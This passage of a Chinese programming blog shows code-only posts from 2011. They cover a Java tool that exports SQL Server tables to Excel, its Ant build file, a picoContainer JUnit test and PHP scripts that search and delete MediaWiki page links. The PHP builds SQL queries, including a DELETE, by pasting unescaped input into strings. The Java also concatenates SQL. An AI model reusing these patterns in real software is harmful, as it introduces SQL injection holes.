class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">package jay;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">import static java.lang.System.out;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFCell;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFCellStyle;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFFont;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFRichTextString;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFRow;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFSheet;</span><br><span class="line">import org.apache.poi.hssf.usermodel.HSSFWorkbook;</span><br><span class="line">import org.apache.poi.hssf.util.HSSFColor;</span><br><span class="line"></span><br><span class="line">public class CheckData &#123;</span><br><span class="line"></span><br><span class="line">  static &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      Class.forName(&quot;com.microsoft.sqlserver.jdbc.SQLServerDriver&quot;);</span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">      // TODO Auto-generated catch block</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void run(String db, boolean only_chinese) throws Exception &#123;</span><br><span class="line">    Map&lt;String, List&lt;String&gt;&gt; map = new HashMap&lt;String, List&lt;String&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    BufferedReader reader = new BufferedReader(new FileReader(db + &quot;.txt&quot;));</span><br><span class="line">    String line;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * table1=field1,field2,field3,field4,field5</span><br><span class="line">     * table2=field1,field2,field3,field4,field5</span><br><span class="line">     */</span><br><span class="line">    while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">      List&lt;String&gt; list = new ArrayList&lt;String&gt;();</span><br><span class="line">      String[] parts = line.split(&quot;=&quot;);</span><br><span class="line">      String table = parts[0];</span><br><span class="line">      String fields = parts[1];</span><br><span class="line">      for (String filed : fields.split(&quot;,&quot;)) &#123;</span><br><span class="line">        list.add(filed.trim());</span><br><span class="line">      &#125;</span><br><span class="line">      map.put(table, list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (String key : map.keySet()) &#123;</span><br><span class="line">      out.println(&quot;table: &quot; + key + &quot;, &quot; + map.get(key));</span><br><span class="line">    &#125;</span><br><span class="line">    reader.close();</span><br><span class="line"></span><br><span class="line">    genData(db, map, only_chinese);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void genData(String db, Map&lt;String, List&lt;String&gt;&gt; map,</span><br><span class="line">      boolean only_chinese) &#123;</span><br><span class="line">    Connection conn = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      conn = DriverManager</span><br><span class="line">          .getConnection(&quot;jdbc:sqlserver://DbServer:1433;integratedSecurity=true;DatabaseName=&quot;</span><br><span class="line">              + &quot;Public_&quot; + db);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HSSFWorkbook wb = new HSSFWorkbook();</span><br><span class="line">    HSSFFont f = wb.createFont();</span><br><span class="line">    f.setFontHeightInPoints((short) 12);</span><br><span class="line">    // f.setColor(HSSFColor.RED.index);</span><br><span class="line">    f.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span><br><span class="line"></span><br><span class="line">    HSSFCellStyle cs = wb.createCellStyle();</span><br><span class="line">    cs.setFont(f);</span><br><span class="line"></span><br><span class="line">    int tables = 0;</span><br><span class="line">    for (String table : map.keySet()) &#123;</span><br><span class="line">      listField(table, map.get(table), wb, cs, conn, only_chinese);</span><br><span class="line">      tables++;</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(&quot;共有&quot; + tables + &quot;个表的数据输出。&quot;);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      String fileName = db + &quot;.xls&quot;;</span><br><span class="line">      if (only_chinese) &#123;</span><br><span class="line">        fileName = db + &quot;-only-chinese.xls&quot;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      FileOutputStream out = new FileOutputStream(fileName);</span><br><span class="line">      wb.write(out);</span><br><span class="line">      out.close();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      conn.close();</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void listField(String table, List&lt;String&gt; options, HSSFWorkbook wb,</span><br><span class="line">      HSSFCellStyle cs, Connection conn, boolean only_chinese) &#123;</span><br><span class="line"></span><br><span class="line">    HSSFSheet sheeet = wb.createSheet(table);</span><br><span class="line">    int row_index = 0;</span><br><span class="line">    HSSFRow row = sheeet.createRow(row_index++);</span><br><span class="line">    for (int i = 0; i &lt; options.size(); i++) &#123;</span><br><span class="line">      HSSFCell cell = row.createCell(i);</span><br><span class="line">      cell.setCellValue(options.get(i));</span><br><span class="line">      cell.setCellStyle(cs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String selectOption = &quot;&quot;;</span><br><span class="line">    for (int i = 0; i &lt; options.size() - 1; i++) &#123;</span><br><span class="line">      selectOption += options.get(i) + &quot;,&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    selectOption += options.get(options.size() - 1);</span><br><span class="line"></span><br><span class="line">    Statement stmt;</span><br><span class="line">    // 检查是否有中文</span><br><span class="line">    final String regexp = &quot;[\u4e00-\u9fa5]+&quot;;</span><br><span class="line">    final Pattern pattern = Pattern.compile(regexp);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      stmt = conn.createStatement();</span><br><span class="line">      ResultSet rs = stmt.executeQuery(&quot;select &quot; + selectOption</span><br><span class="line">          + &quot; from &quot; + table);</span><br><span class="line">      int limit = 65534;</span><br><span class="line">      boolean needCreate = false;</span><br><span class="line">      int sheetIndex = 2;</span><br><span class="line">      while (rs.next()) &#123;</span><br><span class="line">        if (row_index &gt; limit &amp;&amp; row_index &lt;= limit * 2) &#123;</span><br><span class="line">          needCreate = true;</span><br><span class="line">          if (sheetIndex &gt;= 5) &#123;</span><br><span class="line">            out.println(&quot;table: &quot; + table + &quot; 超出最大数量&quot; + sheetIndex</span><br><span class="line">                + &quot;，不再计算&quot;);</span><br><span class="line">            break;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (needCreate) &#123;</span><br><span class="line">          out.println(&quot;table: &quot; + table + &quot;(&quot; + sheetIndex + &quot;)&quot;</span><br><span class="line">              + &quot; 生成&quot;);</span><br><span class="line">          sheeet = wb.createSheet(table + &quot;(&quot; + sheetIndex + &quot;)&quot;);</span><br><span class="line">          sheetIndex++;</span><br><span class="line">          row_index = 1;</span><br><span class="line">          needCreate = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (only_chinese) &#123;</span><br><span class="line">          boolean hasChinese = false;</span><br><span class="line"></span><br><span class="line">          for (int i = 0; i &lt; options.size(); i++) &#123;</span><br><span class="line">            String value = rs.getString(i + 1);</span><br><span class="line">            if (value != null)</span><br><span class="line">              if (pattern.matcher(value).find()) &#123;</span><br><span class="line">                hasChinese = true;</span><br><span class="line">                break;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          if (hasChinese) &#123;</span><br><span class="line">            row = sheeet.createRow(row_index++);</span><br><span class="line">            for (int i = 0; i &lt; options.size(); i++) &#123;</span><br><span class="line">              String value = rs.getString(i + 1);</span><br><span class="line">              HSSFCell cell = row.createCell(i);</span><br><span class="line">              cell.setCellValue(value);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          row = sheeet.createRow(row_index++);</span><br><span class="line">          for (int i = 0; i &lt; options.size(); i++) &#123;</span><br><span class="line">            String value = rs.getString(i + 1);</span><br><span class="line">            HSSFCell cell = row.createCell(i);</span><br><span class="line">            cell.setCellValue(value);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void xlsTest() throws Exception &#123;</span><br><span class="line">    HSSFWorkbook wb = new HSSFWorkbook();</span><br><span class="line"></span><br><span class="line">    HSSFSheet s = wb.createSheet(&quot;sheet1&quot;);</span><br><span class="line"></span><br><span class="line">    HSSFFont f = wb.createFont();</span><br><span class="line">    f.setFontHeightInPoints((short) 12);</span><br><span class="line">    f.setColor(HSSFColor.RED.index);</span><br><span class="line">    f.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span><br><span class="line"></span><br><span class="line">    HSSFCellStyle cs = wb.createCellStyle();</span><br><span class="line">    cs.setFont(f);</span><br><span class="line"></span><br><span class="line">    // Define a few rows</span><br><span class="line">    for (short rownum = (short) 0; rownum &lt; 30; rownum++) &#123;</span><br><span class="line">      HSSFRow row = s.createRow(rownum);</span><br><span class="line">      for (short cellnum = (short) 0; cellnum &lt; 10; cellnum += 2) &#123;</span><br><span class="line">        HSSFCell cell2 = row.createCell(cellnum + 1);</span><br><span class="line"></span><br><span class="line">        cell2.setCellValue(new HSSFRichTextString(&quot;Hello! &quot; + cellnum));</span><br><span class="line">        cell2.setCellStyle(cs);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Save</span><br><span class="line">    FileOutputStream out = new FileOutputStream(&quot;workbook.xls&quot;);</span><br><span class="line">    wb.write(out);</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  static void getMessageTest() throws Exception &#123;</span><br><span class="line">    Connection conn = null;</span><br><span class="line"></span><br><span class="line">    final String regexp = &quot;[\u4e00-\u9fa5]+&quot;;</span><br><span class="line">    final Pattern pattern = Pattern.compile(regexp);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      conn = DriverManager</span><br><span class="line">          .getConnection(&quot;jdbc:sqlserver://DbServer:1433;integratedSecurity=true;DatabaseName=&quot;</span><br><span class="line">              + &quot;Public_X&quot;);</span><br><span class="line"></span><br><span class="line">      Statement stmt = conn.createStatement();</span><br><span class="line">      ResultSet rs = stmt</span><br><span class="line">          .executeQuery(&quot;select dbo.big5ISOToUnicode(dbo.UnicodeToGbkISO(message)) from X where id = 4775&quot;);</span><br><span class="line">      while (rs.next()) &#123;</span><br><span class="line">        String value = rs.getString(1);</span><br><span class="line">        out.println(&quot;&lt;&lt; &quot; + value);</span><br><span class="line">        if (pattern.matcher(value).find()) &#123;</span><br><span class="line">          out.println(&quot;find it...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rs.close();</span><br><span class="line">      stmt.close();</span><br><span class="line">      conn.close();</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    run(&quot;XDataBase&quot;, false); // show all</span><br><span class="line">    run(&quot;XDataBase&quot;, true);  // only chinese character</span><br><span class="line">    // getMessageTest();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>build.xml </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;project default=&quot;run&quot;&gt;</span><br><span class="line">  &lt;target name=&quot;run&quot;&gt;</span><br><span class="line">    &lt;java classname=&quot;jay.CheckData&quot; fork=&quot;yes&quot;&gt;</span><br><span class="line">      &lt;classpath&gt;</span><br><span class="line">        &lt;fileset dir=&quot;poi-3.7&quot;&gt;</span><br><span class="line">          &lt;include name=&quot;poi-3.7-20101029.jar&quot; /&gt;</span><br><span class="line">          &lt;include name=&quot;poi-scratchpad-3.7-20101029.jar&quot; /&gt;</span><br><span class="line">        &lt;/fileset&gt;</span><br><span class="line">        &lt;path location=&quot;sqljdbc4.jar&quot; /&gt;</span><br><span class="line">        &lt;path location=&quot;bin&quot; /&gt;</span><br><span class="line">      &lt;/classpath&gt;</span><br><span class="line">      &lt;jvmarg value=&quot;-Xms1024m&quot; /&gt; &lt;!-- 数据较多，需要设置大内存，用Event model可能会更好 --&gt;</span><br><span class="line">      &lt;jvmarg value=&quot;-Xmx1024m&quot; /&gt;</span><br><span class="line">      &lt;jvmarg value=&quot;-Djava.library.path=E:\Software\JAVA\SQL&quot; /&gt;</span><br><span class="line">    &lt;/java&gt;</span><br><span class="line">  &lt;/target&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-picoContainer的字段注入" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-03-29T07:49:24.000Z"><a href="/2011/03/29/picoContainer%E7%9A%84%E5%AD%97%E6%AE%B5%E6%B3%A8%E5%85%A5/">2011-03-29</a></time>
      
      
  
    <h1 class="title"><a href="/2011/03/29/picoContainer%E7%9A%84%E5%AD%97%E6%AE%B5%E6%B3%A8%E5%85%A5/">picoContainer的字段注入</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import static org.picocontainer.injectors.NamedFieldInjection.injectionFieldNames;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Collection;</span><br><span class="line"></span><br><span class="line">import javax.persistence.EntityManager;</span><br><span class="line">import javax.persistence.Persistence;</span><br><span class="line"></span><br><span class="line">import junit.framework.TestCase;</span><br><span class="line"></span><br><span class="line">import org.picocontainer.DefaultPicoContainer;</span><br><span class="line">import org.picocontainer.injectors.NamedFieldInjection;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class TestAssignment</span><br><span class="line">    extends TestCase</span><br><span class="line">&#123;</span><br><span class="line">  static EntityManager em = Persistence.createEntityManagerFactory(&quot;x_system&quot;).createEntityManager();</span><br><span class="line"></span><br><span class="line">  DefaultPicoContainer pico = new DefaultPicoContainer(new NamedFieldInjection());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  protected void setUp()</span><br><span class="line">      throws Exception</span><br><span class="line">  &#123;</span><br><span class="line">    em.getTransaction().begin();</span><br><span class="line">    pico.addComponent(em);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  protected void tearDown()</span><br><span class="line">      throws Exception</span><br><span class="line">  &#123;</span><br><span class="line">    em.getTransaction().commit();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  public void testBatchMark()</span><br><span class="line">  &#123;</span><br><span class="line">    pico.as(injectionFieldNames(&quot;em&quot;)).addComponent(A.class);</span><br><span class="line">    pico.as(injectionFieldNames(&quot;em&quot;, &quot;a&quot;)).addComponent(B.class);</span><br><span class="line">    pico.as(injectionFieldNames(&quot;em&quot;, &quot;b&quot;)).addComponent(C.class);</span><br><span class="line">    C cBean = pico.getComponent(C.class);</span><br><span class="line">    Collection&lt;X&gt; xs = new ArrayList&lt;X&gt;();</span><br><span class="line"></span><br><span class="line">    cBean.someMethod(&quot;test&quot;, xs);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-MediaWiki的标题和链接处理" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-02-24T09:22:58.000Z"><a href="/2011/02/24/MediaWiki%E7%9A%84%E6%A0%87%E9%A2%98%E5%92%8C%E9%93%BE%E6%8E%A5%E5%A4%84%E7%90%86/">2011-02-24</a></time>
      
      
  
    <h1 class="title"><a href="/2011/02/24/MediaWiki%E7%9A%84%E6%A0%87%E9%A2%98%E5%92%8C%E9%93%BE%E6%8E%A5%E5%A4%84%E7%90%86/">MediaWiki的标题和链接处理</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function showTitle($title)&#123;</span><br><span class="line">    $title = iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, str_replace(&#x27; &#x27;, &#x27;_&#x27;, $title));</span><br><span class="line">    $sql = &quot;SELECT page_title FROM  `page` WHERE  `page_title` LIKE  &#x27;%$title%&#x27;&quot;;</span><br><span class="line">    $result = mysql_query( $sql );</span><br><span class="line">    while ( $line = mysql_fetch_array( $result ) ) &#123;</span><br><span class="line">        echo iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $line[0]) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_free_result( $result );</span><br><span class="line"></span><br><span class="line">    echo &quot;-------------------------- \n&quot;;</span><br><span class="line">    /*$sql = &quot;SELECT pl_from, pl_title FROM  `pagelinks` WHERE  `pl_title` LIKE  &#x27;%$title%&#x27;&quot;;</span><br><span class="line">    $result = mysql_query( $sql );</span><br><span class="line">    while ( $line = mysql_fetch_array( $result ) ) &#123;</span><br><span class="line">        echo $line[0] . &quot; -&gt; &quot; . iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $line[1]) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_free_result( $result );*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function findDeadLinks($title)&#123;</span><br><span class="line">    $title = iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, str_replace(&#x27; &#x27;, &#x27;_&#x27;, $title));</span><br><span class="line">    $sql = &quot;SELECT page_title FROM `page` p, revision r, text t WHERE page_latest = r.rev_id and r.rev_text_id = t.old_id and old_text like &#x27;%$title%&#x27;&quot;;</span><br><span class="line">    $result = mysql_query( $sql );</span><br><span class="line">    while ( $line = mysql_fetch_array( $result ) ) &#123;</span><br><span class="line">        echo &#x27;http://witube.hkma.org.gz/index.php?title=&#x27; . iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $line[0]) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_free_result( $result );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function deleteTitle($title)&#123;</span><br><span class="line">    $title = iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, str_replace(&#x27; &#x27;, &#x27;_&#x27;, $title));</span><br><span class="line">    $sql = &quot;delete FROM `pagelinks` WHERE  `pl_title` = &#x27;$title&#x27;&quot;;</span><br><span class="line">    mysql_query( $sql );</span><br><span class="line">    echo &quot;Record Deleted: &quot; . mysql_affected_rows() . &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()&#123;</span><br><span class="line">    $link = mysql_connect( &#x27;Server&#x27;, &#x27;wiki&#x27;, &#x27;passwd&#x27; ) or die( &#x27;Could not connect&#x27; . mysql_error() );</span><br><span class="line">    mysql_select_db( &#x27;wiki&#x27; );</span><br><span class="line">    //deleteTitle(&#x27;规范参考/技术类/语法检查/CheckStyle/AbstractBase/公共属性列表&#x27;);</span><br><span class="line"></span><br><span class="line">    $handle = fopen(&quot;Noname2&quot;, &quot;r&quot;);</span><br><span class="line">    while (!feof($handle)) &#123;</span><br><span class="line">        $item = fgets($handle);</span><br><span class="line">        $item = str_replace(&quot;\r\n&quot;, &#x27;&#x27;, $item);</span><br><span class="line">        echo $item . &quot;\n&quot;;</span><br><span class="line">        deleteTitle($item);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($handle);</span><br><span class="line">    </span><br><span class="line">    /*$title = &quot;ruts2Adapter替换I18nStrut&quot;;</span><br><span class="line">    showTitle($title);*/</span><br><span class="line">    //findDeadLinks(&#x27;规范参考/技术类&#x27;);</span><br><span class="line">    mysql_close( $link );</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-利用PowerShell截取Checkstyle关于bSpell拼写检查的当前错误行的源文件内容" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-02-14T07:51:18.000Z"><a href="/2011/02/14/%E5%88%A9%E7%94%A8PowerShell%E6%88%AA%E5%8F%96Checkstyle%E5%85%B3%E4%BA%8EbSpell%E6%8B%BC%E5%86%99%E6%A3%80%E6%9F%A5%E7%9A%84%E5%BD%93%E5%89%8D%E9%94%99%E8%AF%AF%E8%A1%8C%E7%9A%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9/">2011-02-14</a></time>
      
      
  
    <h1 class="title"><a href="/2011/02/14/%E5%88%A9%E7%94%A8PowerShell%E6%88%AA%E5%8F%96Checkstyle%E5%85%B3%E4%BA%8EbSpell%E6%8B%BC%E5%86%99%E6%A3%80%E6%9F%A5%E7%9A%84%E5%BD%93%E5%89%8D%E9%94%99%E8%AF%AF%E8%A1%8C%E7%9A%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9/">利用PowerShell截取Checkstyle关于bSpell拼写检查的当前错误行的源文件内容</a></h1>
  

    </header>
